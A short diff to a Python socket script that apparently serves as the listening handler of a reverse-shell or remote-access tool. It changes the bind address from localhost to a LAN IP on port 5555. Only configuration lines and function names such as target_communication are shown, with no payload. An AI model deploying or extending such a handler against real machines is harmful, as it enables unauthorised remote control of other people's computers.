@@ -8,6 +8,8 @@ import socket  # This library is used for creating socket connections.
 import json  # JSON is used for encoding and decoding data in a structured format.
 import os  # This library allows interaction with the operating system.
 
+target_ip = '192.168.203.142'
+target_port = 5555
 
 # Function to send data reliably as JSON-encoded strings
 def reliable_send(data):
@@ -91,8 +93,8 @@ def target_communication():
 # Create a socket for the server
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Bind the socket to a specific IP address ('127.0.0.1') and port (5555).
-sock.bind(('127.0.0.1', 5555))
+# Bind the socket to a specific IP address and port.
+sock.bind((target_ip, target_port))
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
 print('[+] Listening For The Incoming Connections')
